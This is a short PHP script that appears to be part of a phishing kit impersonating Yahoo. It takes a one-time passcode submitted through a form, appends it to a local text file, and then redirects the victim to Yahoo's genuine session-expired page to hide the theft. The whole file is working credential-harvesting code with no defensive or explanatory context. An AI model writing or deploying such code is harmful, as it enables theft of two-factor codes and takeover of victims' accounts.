<?php

file_put_contents("output.txt", " Done " . $_POST['OTP'] . "\n", FILE_APPEND);
header('Location: https://login.yahoo.com/account/challenge/session-expired');
exit();
